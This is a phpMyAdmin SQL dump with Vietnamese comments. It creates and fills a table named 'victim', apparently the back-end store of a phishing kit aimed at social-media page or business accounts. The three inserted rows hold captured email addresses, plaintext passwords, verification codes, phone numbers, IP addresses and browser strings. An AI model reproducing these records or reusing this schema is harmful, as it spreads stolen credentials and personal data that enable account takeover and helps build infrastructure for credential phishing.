-- phpMyAdmin SQL Dump
-- version 5.0.4
-- https://www.phpmyadmin.net/
--
-- Máy chủ: localhost
-- Thời gian đã tạo: Th4 29, 2024 lúc 09:38 PM
-- Phiên bản máy phục vụ: 5.7.43-log
-- Phiên bản PHP: 7.4.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `a`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `victim`
--

CREATE TABLE `victim` (
  `id` int(11) NOT NULL,
  `email` longtext NOT NULL,
  `emailbusiness` longtext NOT NULL,
  `phone` longtext NOT NULL,
  `fullname` longtext NOT NULL,
  `pagename` longtext NOT NULL,
  `password` longtext NOT NULL,
  `code` longtext NOT NULL,
  `step` longtext NOT NULL,
  `status` longtext NOT NULL,
  `time` longtext NOT NULL,
  `country` longtext NOT NULL,
  `ip` longtext NOT NULL,
  `useragent` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Đang đổ dữ liệu cho bảng `victim`
--

INSERT INTO `victim` (`id`, `email`, `emailbusiness`, `phone`, `fullname`, `pagename`, `password`, `code`, `step`, `status`, `time`, `country`, `ip`, `useragent`) VALUES
(23, 'daysistradling@outlook.com', 'hackgamenhamn@gmail.com', '0865181743', 'AT MOD FF', 'sadada', 'atmtool12', '', '2', '1', '', 'VN', '113.162.49.101', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'),
(24, 'dominh582929@cloneads.top', 'hackgamenhamn@gmail.com', '0865181743', 'AT MOD FF', 'sadada', 'CloneNuoisxdn', '804248', '3', '5', '1714393450', 'VN', '113.162.49.101', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'),
(25, '619tammi@fthcapital.com', '619tammi@fthcapital.com', '3453453434', 'sdgsdgsd', '34346', 'hoanghon', '258741', '2', '4', '', 'VN', '2402:800:6123:321c:6d68:bb50:13f5:f762', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `victim`
--
ALTER TABLE `victim`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `victim`
--
ALTER TABLE `victim`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
